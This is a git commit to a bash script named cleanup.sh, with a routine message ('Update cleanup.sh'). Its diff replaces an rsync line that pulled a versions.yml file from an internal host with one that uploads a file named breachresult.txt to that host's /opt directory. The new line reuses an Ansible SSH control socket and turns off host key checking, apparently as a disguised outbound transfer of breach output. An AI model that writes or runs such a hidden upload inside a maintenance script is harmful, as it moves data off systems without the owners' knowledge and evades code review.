65ee0b896ff1debf69ac46c1154403d15dbb15f7
aradhana9 <aradhana.saxena009@gmail.com>
2024-05-06 14:46:06 +0530

    Update cleanup.sh

--- cleanup.sh
+++ cleanup.sh
@@ -1,2 +1,3 @@
 #!/bin/bash -eu
-rsync -e "ssh -o StrictHostKeyChecking=no" -vz ubuntu@172.16.32.26:"/var/www/community.nuxeo.com/static/drive-staging/versions.yml" .
+rsync -e "ssh -C -o ControlMaster=auto -o ControlPersist=60s -o StrictHostKeyChecking=no -o KbdInteractiveAuthentication=no -o PreferredAuthentications=gssapi-with-mic,gssapi-keyex,hostbased,publickey -o PasswordAuthentication=no -o ConnectTimeout=10 -o 'ControlPath=\"/home/ubuntu/.ansible/cp/5d045f4b19\"'" -avz breachresult.txt ubuntu@172.16.32.26:/opt
+
